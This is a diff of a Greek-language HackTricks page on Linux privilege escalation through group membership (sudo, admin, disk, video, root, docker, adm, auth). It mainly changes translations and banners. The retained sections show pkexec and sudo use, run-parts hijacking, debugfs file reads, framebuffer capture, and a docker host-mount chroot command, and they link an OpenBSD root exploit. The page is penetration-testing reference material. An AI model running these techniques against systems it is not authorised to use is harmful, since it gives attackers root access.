@@ -1,22 +1,23 @@
 # Ενδιαφέρουσες Ομάδες - Ανύψωση Δικαιωμάτων στο Linux
 
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>
+<summary>Υποστηρίξτε το HackTricks</summary>
 
-Άλλοι τρόποι υποστήριξης του HackTricks:
-
-* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Κοινοποιήστε τεχνικές χάκινγκ υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο GitHub.
 
 </details>
+{% endhint %}
 
 ## Ομάδες Sudo/Admin
 
-### **PE - Μέθοδος 1**
+### **Ανύψωση Δικαιωμάτων - Μέθοδος 1**
 
 **Μερικές φορές**, **από προεπιλογή (ή επειδή κάποιο λογισμικό το απαιτεί)** μέσα στο αρχείο **/etc/sudoers** μπορείτε να βρείτε μερικές από αυτές τις γραμμές:
 ```bash
@@ -32,13 +33,13 @@
 ```
 sudo su
 ```
-### Μέθοδος PE 2
+### Μέθοδος 2
 
-Βρείτε όλα τα suid δυαδικά και ελέγξτε αν υπάρχει το δυαδικό **Pkexec**:
+Βρείτε όλα τα suid δυαδικά αρχεία και ελέγξτε αν υπάρχει το δυαδικό αρχείο **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Αν ανακαλύψετε ότι το δυαδικό **pkexec είναι ένα SUID δυαδικό** και ανήκετε στα **sudo** ή **admin**, μπορείτε πιθανόν να εκτελέσετε δυαδικά ως sudo χρησιμοποιώντας το `pkexec`.\
+Αν ανακαλύψετε ότι το δυαδικό **pkexec είναι ένα SUID δυαδικό** και ανήκετε στα **sudo** ή **admin**, μπορείτε πιθανότατα να εκτελέσετε δυαδικά ως sudo χρησιμοποιώντας το `pkexec`.\
 Αυτό συμβαίνει επειδή συνήθως αυτές είναι οι ομάδες μέσα στην **πολιτική polkit**. Αυτή η πολιτική αναγνωρίζει βασικά ποιες ομάδες μπορούν να χρησιμοποιήσουν το `pkexec`. Ελέγξτε το με:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
@@ -104,9 +105,11 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-Αν μπορούμε να απαγάγουμε ορισμένα προγράμματα στο `/usr/local`, μπορούμε εύκολα να αποκτήσουμε root πρόσβαση.
+### Ενδιαφέρουσες Ομάδες στο Linux Προνομιακής Επέκτασης
 
-Η απαγωγή του προγράμματος `run-parts` είναι ένας εύκολος τρόπος για να αποκτήσουμε root πρόσβαση, επειδή τα περισσότερα προγράμματα θα εκτελέσουν ένα `run-parts` όπως (crontab, όταν συνδεθείτε μέσω ssh).
+Εάν μπορούμε να αρπάξουμε ορισμένα προγράμματα στο `/usr/local`, μπορούμε εύκολα να αποκτήσουμε ριζικά δικαιώματα.
+
+Η αρπαγή του προγράμματος `run-parts` είναι ένας τρόπος εύκολος για να αποκτήσουμε ριζικά δικαιώματα, επειδή τα περισσότερα προγράμματα θα εκτελέσουν ένα `run-parts` όπως (crontab, όταν συνδέεται κάποιος μέσω ssh).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -166,7 +169,7 @@ debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
 Ωστόσο, αν προσπαθήσετε να **εγγράψετε αρχεία που ανήκουν στο χρήστη root** (όπως `/etc/shadow` ή `/etc/passwd`) θα λάβετε ένα σφάλμα "**Άρνηση πρόσβασης**".
 
-## Ομάδα Video
+## Ομάδα Βίντεο
 
 Χρησιμοποιώντας την εντολή `w` μπορείτε να βρείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανίσει ένα αποτέλεσμα όπως το παρακάτω:
 ```bash
@@ -183,13 +186,13 @@ cat /sys/class/graphics/fb0/virtual_size
 ```
 Για να **ανοίξετε** την **ακατέργαστη εικόνα** μπορείτε να χρησιμοποιήσετε το **GIMP**, επιλέξτε το αρχείο \*\*`screen.raw` \*\* και επιλέξτε ως τύπο αρχείου **Raw image data**:
 
-![](<../../../.gitbook/assets/image (287) (1).png>)
+![](<../../../.gitbook/assets/image (463).png>)
 
 Στη συνέχεια τροποποιήστε το Πλάτος και το Ύψος στις τιμές που χρησιμοποιούνται στην οθόνη και ελέγξτε διαφορετικούς Τύπους Εικόνας (και επιλέξτε αυτόν που εμφανίζει καλύτερα την οθόνη):
 
-![](<../../../.gitbook/assets/image (288).png>)
+![](<../../../.gitbook/assets/image (317).png>)
 
-## Root Group
+## Ομάδα Root
 
 Φαίνεται ότι από προεπιλογή τα **μέλη της ομάδας root** μπορεί να έχουν πρόσβαση για **τροποποίηση** ορισμένων αρχείων ρυθμίσεων **υπηρεσιών** ή ορισμένων αρχείων **βιβλιοθηκών** ή **άλλων ενδιαφερουσών πραγμάτων** που θα μπορούσαν να χρησιμοποιηθούν για την ανάδειξη προνομίων...
 
@@ -199,7 +202,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Ομάδα Docker
 
-Μπορείτε **να προσαρτήσετε το σύστημα αρχείων ρίζας του κεντρικού υπολογιστή σε έναν όγκο της μηχανής**, έτσι ώστε όταν η μηχανή ξεκινά, φορτώνει αμέσως ένα `chroot` σε αυτόν τον όγκο. Αυτό σας δίνει αποτελεσματικά root στη μηχανή.
+Μπορείτε να **προσαρτήσετε το σύστημα αρχείων ρίζας του κεντρικού υπολογιστή σε έναν όγκο μιας εικόνας**, έτσι ώστε όταν ξεκινά η εικόνα, φορτώνει αμέσως ένα `chroot` σε αυτόν τον όγκο. Αυτό σας δίνει αποτελεσματικά root στον υπολογιστή.
 ```bash
 docker image #Get images from the docker service
 
@@ -219,10 +222,10 @@ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chr
 
 ## Ομάδα Adm
 
-Συνήθως τα **μέλη** της ομάδας **`adm`** έχουν δικαιώματα να **διαβάζουν αρχεία καταγραφής** που βρίσκονται μέσα στον φάκελο _/var/log/_.\
-Επομένως, αν έχετε μολυνθεί έναν χρήστη μέσα σε αυτή την ομάδα, οπωσδήποτε θα πρέπει να **ελέγξετε τα αρχεία καταγραφής**.
+Συνήθως τα **μέλη** της ομάδας **`adm`** έχουν δικαιώματα να **διαβάζουν αρχεία καταγραφής** που βρίσκονται μέσα στο _/var/log/_.\
+Επομένως, αν έχετε μολυνθεί έναν χρήστη μέσα σε αυτή την ομάδα, οπωσδήποτε θα πρέπει να ρίξετε μια **ματιά στα logs**.
 
 ## Ομάδα Auth
 
 Στο OpenBSD η ομάδα **auth** συνήθως μπορεί να γράψει στους φακέλους _**/etc/skey**_ και _**/var/db/yubikey**_ αν χρησιμοποιούνται.\
-Αυτά τα δικαιώματα μπορούν να καταχραστούν με τον παρακάτω εκμεταλλευτή για **εξώθηση προνομίων** σε root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Αυτά τα δικαιώματα μπορούν να καταχραστούν με το ακόλουθο exploit για **εξώθηση προνομίων** σε root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
